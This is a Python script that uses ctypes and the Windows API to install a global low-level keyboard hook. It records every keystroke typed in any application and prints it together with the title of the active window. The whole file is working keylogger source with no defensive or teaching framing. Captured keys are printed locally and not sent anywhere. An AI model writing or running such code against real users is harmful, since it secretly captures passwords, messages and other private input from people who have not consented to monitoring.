from ctypes import *
from ctypes import wintypes

#globals
last = None

#--------------------------------------------------------------------------------------------
# WIN API VARIABLES 
#--------------------------------------------------------------------------------------------
user32 = windll.user32

LRESULT = c_long
WH_KEYBOARD_LL = 13

WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10

#https://docs.microsoft.com/en-us/windows/win32/api/winuser/nc-winuser-hookproc
HOOKPROC = CFUNCTYPE(
        LRESULT, 
        wintypes.INT,
        wintypes.WPARAM,
        wintypes.LPARAM
    )

#https://docs.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-kbdllhookstruct
class KBDLLHOOKSTRUCT(Structure):
        _fields_ = [
            ("vkCode", wintypes.DWORD),
            ("scanCode", wintypes.DWORD),
            ("flags", wintypes.DWORD),
            ("time", wintypes.DWORD),
            ("dwExtracInfo", wintypes.ULONG)
        ]

#--------------------------------------------------------------------------------------------
# WIN API FUNCTIONS
#--------------------------------------------------------------------------------------------

#getwindowtextlengtha - pass
#https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowtextlengtha

GetWindowTextLengthA            = user32.GetWindowTextLengthA
GetWindowTextLengthA.restype    = wintypes.INT
GetWindowTextLengthA.argtypes   = [
        wintypes.HWND
    ]

#getwindowtexta - pass
#https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowtexta
GetWindowTextA                  = user32.GetWindowTextA
GetWindowTextA.restype          = wintypes.INT
GetWindowTextA.argtypes         = [
        wintypes.HWND,
        wintypes.LPSTR,
        wintypes.INT
    ]

#getkeystate
#https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate
GetKeyState             = user32.GetKeyState 
GetKeyState.restype     = wintypes.SHORT
GetKeyState.argtypes    = [
        wintypes.INT
    ]

#getkeybaordstate
#https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeyboardstate
GetKeyboardState            = user32.GetKeyboardState
GetKeyboardState.restype    = wintypes.BOOL
GetKeyboardState.argtypes   = [
        POINTER(wintypes.BYTE * 256) #256-byte array
    ]

#toascii
#https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-toascii
ToAscii             = user32.ToAscii
ToAscii.restype     = wintypes.INT
ToAscii.argtypes    = [
        wintypes.UINT,
        wintypes.UINT,
        POINTER(wintypes.BYTE * 256), #256-byte array
        wintypes.LPWORD, #out
        wintypes.UINT
    ]

#callnexthookex
#https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex
CallNextHookEx          = user32.CallNextHookEx
CallNextHookEx.restype  = LRESULT
CallNextHookEx.argtypes = [
        wintypes.HHOOK, #optional, ignored
        wintypes.INT,
        wintypes.WPARAM,
        wintypes.LPARAM
    ]

#setwindowshookexa
#https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
SetWindowsHookExA           = user32.SetWindowsHookExA
SetWindowsHookExA.restype   = wintypes.HHOOK
SetWindowsHookExA.argtypes  = [
        wintypes.INT,
        HOOKPROC, #pointer to hook procedure
        wintypes.HINSTANCE,
        wintypes.DWORD,

    ]

#getmessagea
#https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getmessage
GetMessageA              = user32.GetMessageA
GetMessageA.restype      = wintypes.BOOL
GetMessageA.argtypes     = [
        wintypes.LPMSG, #pointer
        wintypes.HWND,  #optional
        wintypes.UINT,
        wintypes.UINT
    ]


#--------------------------------------------------------------------------------------------
# PROGRAM
#--------------------------------------------------------------------------------------------

#https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getforegroundwindow
def get_foreground_process():
    hwnd = user32.GetForegroundWindow()
    length = GetWindowTextLengthA(hwnd)
    buff = create_string_buffer(length + 1)
    GetWindowTextA(hwnd, buff, length + 1)

    return buff.value

def hook_function(nCode, wParam, lParam):
    global last

    if last != get_foreground_process():
        last = get_foreground_process()
        print("\n[{}]".format(last.decode("latin-1")))

    if wParam == WM_KEYDOWN:
        keyboard = KBDLLHOOKSTRUCT.from_address(lParam)

        state = (wintypes.BYTE * 256)()
        GetKeyState(WM_SHIFT)
        GetKeyboardState(byref(state))

        buf = (c_ushort * 1)()
        n = ToAscii(keyboard.vkCode, keyboard.scanCode, state, buf, 0)

        if n > 0:
            if keyboard.vkCode == WM_RETURN:
                print("", "Return")
            else:
                print("{}".format(string_at(buf).decode("latin-1")), end="", flush=True )

    return CallNextHookEx(hook, nCode, wParam, lParam)

#--------------------------------------------------------------------------------------------

mycallback = HOOKPROC(hook_function)
hook = SetWindowsHookExA(WH_KEYBOARD_LL, mycallback, 0, 0)
GetMessageA(byref(wintypes.MSG()), 0, 0, 0)
